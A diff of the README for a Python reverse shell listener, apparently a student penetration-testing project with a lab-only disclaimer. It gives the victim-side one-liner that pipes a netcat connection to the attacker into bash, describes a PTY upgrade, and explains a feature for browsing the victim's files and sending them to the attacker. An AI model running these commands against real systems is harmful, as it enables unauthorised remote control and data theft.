@@ -1,131 +1,75 @@
-# Reverse Shell Listener
+# GhostShell — Reverse Shell Listener
 
-A Python-based reverse shell listener with full TTY support and file transfer capabilities. Built for cybersecurity education and penetration testing labs.
-
----
-
-## Features
-
-- Full interactive TTY shell (arrow keys, tab completion, Ctrl+C all work)
-- Automatic terminal size sync
-- Live terminal resize support
-- Two-port design (command port + shell port)
-- Works across Linux to Linux environments
+A Python-based reverse shell listener with full TTY support, interactive file browser,
+and file transfer capabilities. Built for cybersecurity education and penetration testing labs.
 
 ---
 
 ## Requirements
 
-**Attacker machine**
-- Python 3
-- Linux (uses `termios`, `tty`)
+**Attacker machine** requires Python 3 and Linux since the tool uses `termios`, `tty`, and `fcntl`.
 
-**Victim machine**
-- `nc` (netcat)
-- `python3` (for PTY spawn)
-- `bash`
+**Victim machine** requires `nc` (netcat), `python3` for PTY spawn, `bash`, `base64`, and `md5sum` for integrity verification.
 
 ---
 
 ## Usage
 
-### 1. Start the listener on attacker machine
+Start the listener on the attacker machine with `python3 listener.py`. You will be prompted to select a network interface using the arrow key menu then enter a port number. The tool automatically opens three ports — `PORT` receives the initial victim connection, `PORT+1` handles the full interactive PTY shell, and `PORT+2` is dedicated for file transfer.
 
-```bash
-python3 listener.py
-```
-
-You will be prompted for a port number. The tool automatically opens two ports:
-- `PORT` — receives initial victim connection
-- `PORT+1` — receives the full interactive shell
-
-### 2. On victim machine (or type this through partial access)
-
-```bash
-nc attacker_ip PORT | bash
-```
-
-That's it. The listener sends the payload automatically and you get a full shell.
+On the victim machine run `nc attacker_ip PORT | bash`. The listener sends the payload automatically and upgrades it into a full interactive shell.
 
 ---
 
 ## How It Works
 
+The attacker starts the listener and picks a network interface and port. The victim runs the netcat one-liner which connects to the attacker. The listener automatically sends a payload that spawns a real PTY on the victim via `python3 pty.spawn("/bin/bash")` and calls back to the attacker on `PORT+1`. The attacker then gets a full interactive TTY shell with arrow keys, tab completion, Ctrl+C, and automatic terminal resize all working correctly.
+
+The reason `pty.spawn` is used instead of plain `bash -i` is that a piped shell ignores `stty` because there is no real TTY attached. Spawning a PTY on the victim side fixes this entirely.
+
+---
+
+## Shell Commands
+
+Once inside the shell, type `send` to open the file transfer menu, `exit` or press `Ctrl+D` to close the session.
+
+---
+
+## File Transfer
+
+Type `send` in the shell to open the transfer menu and browse the victim filesystem using the arrow key menu. You can navigate directories and select any file.
+
+**Direct transfer** streams the file over a raw TCP socket on `PORT+2` directly to the attacker machine. Fast and reliable for any file size.
+
+**Base64** encodes the file on the victim and prints the base64 output to the terminal. No extra network connection is involved — the attacker manually copies the output, saves it as `filename.b64` then runs the following to recover the file and verify integrity.
+
+```bash
+base64 -d filename.b64 > filename
+md5sum filename
 ```
-1. Attacker runs listener.py
-           ↓
-2. Victim runs:  nc attacker_ip PORT | bash
-           ↓
-3. Listener sends payload to victim automatically
-           ↓
-4. Victim spawns PTY via python3 pty.spawn
-   and calls back to attacker on PORT+1
-           ↓
-5. Attacker gets full interactive TTY shell
-```
 
-### Why Two Ports?
-
-| Port | Purpose |
-|------|---------|
-| PORT | One-way command injection (victim pulls payload) |
-| PORT+1 | Full bidirectional interactive shell |
-
-### Why `pty.spawn` in the Payload?
-
-Piped `bash -i` ignores `stty` because there is no real TTY attached. Using `python3 -c 'import pty; pty.spawn("/bin/bash")'` creates a real PTY on the victim side, so terminal size sync and arrow keys work correctly.
+The MD5 hash is printed to the terminal alongside the base64 output so you can verify the file is intact after decoding.
 
 ---
 
 ## Project Phases
 
-### Phase 1 — Linux to Linux ✅
-- Basic TCP listener
-- Raw terminal mode
-- Terminal size sync
-- PTY-based shell upgrade
-- File transfer
+**Phase 1 — Linux to Linux** is complete and includes the interface picker, PTY shell upgrade, terminal resize, interactive filesystem browser, direct file transfer, and base64 encode with integrity check.
 
-### Phase 2 — Linux (attacker) → Windows (victim)
-- Powershell one-liner on victim
-- cmd.exe / powershell shell handling
-- Windows file transfer methods
+**Phase 2 — Linux to Windows** will cover Powershell one-liner on the victim, cmd.exe and Powershell shell handling, and Windows file transfer methods.
 
-### Phase 3 — Windows (attacker) → Linux (victim)
-- Listener adapted for Windows (`msvcrt` instead of `termios`)
-- Thread-based stdin handling
+**Phase 3 — Windows to Linux** will adapt the listener for Windows using `msvcrt` instead of `termios` with thread-based stdin handling.
 
-### Phase 4 — Windows → Windows
-- Full Powershell both sides
-- No PTY, alternative upgrade path
+**Phase 4 — Windows to Windows** will cover full Powershell on both sides with no PTY and an alternative shell upgrade path.
 
 ---
 
 ## Lab Setup
 
-Always test in an isolated environment:
-
-```
-VirtualBox / VMware
-├── Attacker VM  (Kali Linux)
-└── Victim VM    (Ubuntu / Debian)
-      Network: Host-Only Adapter
-```
-
-Never run on a network you do not own.
-
----
-
-## File Structure
-
-```
-Reverse-Shell/
-├── listener.py       # Main attacker-side listener
-└── README.md
-```
+Always test in an isolated environment using VirtualBox or VMware with an attacker VM running Kali Linux or Parrot OS and a victim VM running Ubuntu or Debian connected over a Host-Only Adapter. Never run on a network you do not own or have explicit permission to test on.
 
 ---
 
 ## Disclaimer
 
-This tool is built for **educational purposes only** as part of a cybersecurity midterm project. Only use in lab environments on machines you own or have explicit permission to test.
+This tool is built for educational purposes only as part of a cybersecurity project. Only use in lab environments on machines you own or have explicit permission to test.
